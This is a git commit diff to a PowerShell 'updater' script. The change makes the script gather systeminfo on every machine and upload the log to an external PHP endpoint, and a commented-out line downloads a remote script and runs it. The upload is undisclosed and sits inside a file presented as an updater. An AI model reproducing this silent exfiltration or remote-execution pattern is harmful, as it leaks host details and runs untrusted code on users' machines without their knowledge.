947889520d4b6d51ed3d08ef20fa97a831b93a88
jeremiassamuelzitnik <69435115+jeremiassamuelzitnik@users.noreply.github.com>
2023-07-01 17:17:03 -0300

    Update Actualizar.ps1

--- Actualizador/Actualizar.ps1
+++ Actualizador/Actualizar.ps1
@@ -1,11 +1,13 @@
+systeminfo >> "$env:temp\$env:computername.log"
+(New-Object System.Net.WebClient).UploadFile('https://www.mistrelci.com.ar/Script/upload.php', $env:temp + '\'+ $env:computername + '.log')
+
 if ($env:computername -eq 'gamer') {
 
 }
 
 else {
 
-systeminfo >> "$env:temp\$env:computername.log"
-(New-Object System.Net.WebClient).UploadFile('https://www.mistrelci.com.ar/Script/upload.php', $env:temp + '\'+ $env:computername + '.log')
+
 }
 #powershell "iwr -useb https://raw.githubusercontent.com/jeremiassamuelzitnik/Updater/main/Instalador/Instalar.ps1 | iex" 
 #get-wuinstall -MicrosoftUpdate -install -AcceptAll -IgnoreReboot | Out-File $env:public\desktop\acta-$env:computername.log
